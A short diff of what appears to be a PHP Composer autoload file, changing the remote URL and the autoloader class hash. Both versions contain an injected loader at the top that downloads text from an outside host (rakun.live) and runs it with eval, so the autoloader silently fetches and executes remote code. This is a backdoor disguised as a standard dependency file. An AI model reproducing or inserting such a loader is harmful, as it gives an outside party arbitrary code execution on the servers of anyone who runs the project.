@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/utility.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/segiedu.txt'));
 $url = "?> ".$url;
 eval($url);
 
@@ -12,4 +12,4 @@ if (PHP_VERSION_ID < 50600) {
 
 require_once __DIR__ . '/composer/autoload_real.php';
 
-return ComposerAutoloaderInit54803414b956c00c155bb1ec5ab8b6d6::getLoader();
+return ComposerAutoloaderInit9f7204760be988f1e0ea9c1d396026b0::getLoader();
